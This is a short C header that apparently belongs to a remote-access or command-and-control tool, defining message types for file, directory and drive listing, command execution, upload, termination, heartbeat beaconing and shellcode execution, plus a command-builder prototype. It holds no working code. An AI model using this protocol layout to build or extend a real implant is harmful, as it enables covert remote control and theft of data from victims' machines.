#pragma once

#include "packet.h"

#define MISSION_TYPE_FILE		1
#define MISSION_TYPE_DIR		2
#define MISSION_TYPE_DRIVE		3
#define MISSION_TYPE_CMD		4
#define MISSION_TYPE_UPLOAD		5

#define COMMAND_TYPE_TERMINATE	6
#define COMMAND_TYPE_SHELLCODE	7
#define COMMAND_TYPE_HEARTBEAT	8

char* buildCmd(CONST char* data, int datalen, int type);